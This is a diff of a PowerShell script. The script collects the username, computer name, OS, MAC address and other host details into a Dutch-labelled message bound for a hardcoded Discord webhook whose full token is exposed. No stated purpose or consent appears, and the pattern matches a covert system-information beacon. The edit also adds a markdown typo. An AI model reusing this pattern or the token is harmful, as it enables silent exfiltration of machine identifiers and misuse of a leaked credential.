@@ -1,4 +1,4 @@
-﻿$sysInfo = @{
+$sysInfo = @{
     Username     = $env:USERNAME
     ComputerName = $env:COMPUTERNAME
     OS           = (Get-CimInstance Win32_OperatingSystem).Caption
@@ -11,9 +11,9 @@
     MAC          = (Get-NetAdapter | Where-Object { $_.Status -eq 'Up' } | Select-Object -First 1).MacAddress
 }
 
-$message = "📡 **Systeeminformatie** `$(Get-Date)` `n"
+$message = "`n📡 **Systeeminformatie** (`$(Get-Date)`)`n`n"
 foreach ($key in $sysInfo.Keys) {
-    $message += "**$key**: $($sysInfo[$key])`n"
+    $message += "**$key**:** $($sysInfo[$key])`n"
 }
 
 $webhookUrl = "https://discord.com/api/webhooks/1394778160842805318/hkY1HVMnKH-Lng3c8qrz9D2nDrpGKc6Zd5sadsXsMhLD7YPsylcx14By-TgKAG8S8cCt"
